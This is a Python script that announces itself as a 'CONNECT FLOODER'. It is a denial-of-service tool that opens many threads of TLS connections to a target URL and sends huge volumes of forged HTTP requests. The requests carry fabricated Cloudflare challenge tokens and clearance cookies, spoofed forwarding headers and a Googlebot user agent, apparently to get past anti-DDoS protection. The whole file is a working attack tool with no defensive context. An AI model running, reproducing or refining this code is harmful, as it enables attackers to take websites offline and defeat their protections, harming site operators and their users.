import socket,ssl,threading,struct,datetime,random,string
from MODEL.data import get_target,gen_id,generate_url_path,gen_ips,same_random

def datetime_to_epoch():
    date_string = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    date_obj = datetime.datetime.strptime(date_string, "%Y-%m-%d %H:%M:%S")
    return int(date_obj.timestamp())

def CONNECT_SEND(s,byt,target):
   for _ in range(2500):
    try:
     for _ in range(250):
       s.sendall(byt[0]); s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1))
       s.sendall(byt[1]); s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1))
     s.shutdown(socket.SHUT_RDWR); s.close()
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((str(target['host']),int(target['port']))); s.connect_ex((str(target['host']),int(target['port'])))
     s = ssl.SSLContext(ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1_1,ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_SSLv23).wrap_socket(s,server_hostname=target['host'])
    except:pass

def CONNECT(target,duration_sec_attack_dude,byt):
    for _ in range(int(duration_sec_attack_dude)):
        try:
            for _ in range(500):
             s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
             s.connect((str(target['host']),int(target['port'])))
             s.connect_ex((str(target['host']),int(target['port'])))
             threading.Thread(target=CONNECT_SEND,args=(ssl.SSLContext(ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1_1,ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_SSLv23).wrap_socket(s,server_hostname=target['host']),byt,target)).start()
        except Exception as e:pass
import sys
url = ''
time_booter = 0
thread_lower = 0
mode_uam = 0
meth_http = ''
if len(sys.argv) == 6:
   url = sys.argv[1]
   thread_lower = int(sys.argv[2])
   time_booter = int(sys.argv[3])
   meth_http = sys.argv[4]
   mode_uam = int(sys.argv[5])
else:
 print(f'WELCOME TO CONNECT FLOODER\n{sys.argv[0]} <URL> <THREAD> <TIME> <METH-HTTP> <UAM>')
target = get_target(url)
num = 1
for _ in range(int(thread_lower)):
   link = ''
   string_abc = string.ascii_letters+string.digits
   string_abc2 = string.ascii_lowercase+string.digits
   useragent = ','.join([f"Mozilla/5.0 (compatible; {generate_url_path(string=string.ascii_uppercase,num=10)}/{'.'.join([str(random.randint(0,9)) for _ in range(2)])}; +http://{gen_ips()})" for _ in range(15)])
   useragent += ','+','.join([f"{generate_url_path(string=string.ascii_uppercase,num=10)}/{'.'.join([str(random.randint(0,9)) for _ in range(2)])} (+http://{gen_ips()})" for _ in range(10)])
   useragent += ','+','.join([f"{generate_url_path(string=string.ascii_uppercase,num=10)} (+http://{gen_ips()})" for _ in range(5)])
   head = same_random("\r\n")
   if mode_uam == 0:link = url
   else:
       type_c = ''
       if mode_uam == 1:type_c = '__cf_chl_tk'
       elif mode_uam == 2:type_c = '__cf_chl_rt_tk'
       elif mode_uam == 3:type_c = '__cf_chl_f_tk'
       elif mode_uam == 4:type_c = '__cf_chl_captcha_tk__'
       elif mode_uam == 5:type_c = '__cf_chl_managed_tk__'
       elif mode_uam == 6:type_c = '__cf_chl_jschl_tk__'
       link = 'https://'+url.replace('https://','').replace('http://','').replace('/','')+f"/?{type_c}={generate_url_path(string=string_abc+'_',num=43)}-{datetime_to_epoch()}-{random.choice(('0','1'))}.{random.choice(('0','1'))}.{random.choice(('0','1'))}.{random.choice(('0','1'))}-{generate_url_path(string='0123456789',num=4)}"
   byt = [f"{meth_http} {a} HTTP/1.1\r\nHost: {target['host']}\r\nCDN-Loop: cloudflare\r\n{head[0]}{head[1]}{head[2]}{head[3]}CF-Worker: {gen_ips()}/*\r\nReferer: {link}\r\nCookie: _cfuvid={generate_url_path(string=string_abc+'_.',num=43)}-{datetime_to_epoch()}-{random.choice(('0','1'))}.{random.choice(('0','1'))}.{random.choice(('0','1'))}.{random.choice(('0','1'))}-{generate_url_path(string='0123456789',num=random.randint(1,999999))}; __cflb={generate_url_path(string=string_abc,num=43)}; __cf_bm={generate_url_path(string=string_abc+'_',num=random.randint(1,18))}.{generate_url_path(string=string_abc,num=random.randint(1,24))}-{datetime_to_epoch()}-{random.choice(('1','0'))}.{random.choice(('1','0'))}.{random.choice(('1','0'))}.{random.choice(('1','0'))}-{generate_url_path(string=string_abc+'_',num=random.randint(1,84))}; _ga_{generate_url_path(string=string_abc,num=4)}=GS1.1.{datetime_to_epoch()}.4.1.{datetime_to_epoch()}.0.0.0; _gid=GA1.2.{generate_url_path(string='0123456789',num=9)}.{datetime_to_epoch()}; __cfduid={generate_url_path(string='abcdefghijklmnopqrstuvwxyz0123456789',num=43)}; cf_clearance={generate_url_path(string=string_abc,num=random.randint(1,21))}.{generate_url_path(string=string_abc+'_',num=random.randint(1,21))}-{datetime_to_epoch()}-{random.choice(('0','1'))}.{random.choice(('0','1'))}.{random.choice(('0','1'))}.{random.choice(('0','1'))}-{generate_url_path(string=string_abc+'_',num=random.randint(1,61))}.{generate_url_path(string=string_abc+'_',num=random.randint(1,22))}.{generate_url_path(string=string_abc+'_',num=random.randint(1,85))}; PHPSESSID={gen_id(15)}; _ym_uid={generate_url_path(string='0123456789',num=19)}; _ym_d={generate_url_path(string='0123456789',num=10)}; _ym_isad={generate_url_path(string='0123456789',num=1)}; \r\nUser-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html), {useragent}\r\nConnection: keep-alive, upgrade\r\nKeep-Alive: timeout=1, max=9999999\r\nX-Forwarded-Host: {target['host']}\r\nX-Forwarded-Proto: https\r\nX-Forwarded-For: {', '.join([gen_ips() for _ in range(4)])}\r\nForwarded: by={gen_ips()};for={gen_ips()};host={target['host']};proto=https\r\n{head[6]}{head[7]}{head[8]}{head[9]}{head[10]}{head[11]}Upgrade: HTTP/1.0, HTTP/1.2, HTTP/1.3, HTTP/2, HTTP/3, HTTPS, HTTP\r\n\r\n".encode() for a in [target['uri'],f'/{generate_url_path(num=num)}']]
   for _ in range(10):threading.Thread(target=CONNECT,args=(target,time_booter,byt)).start()
   num += 1
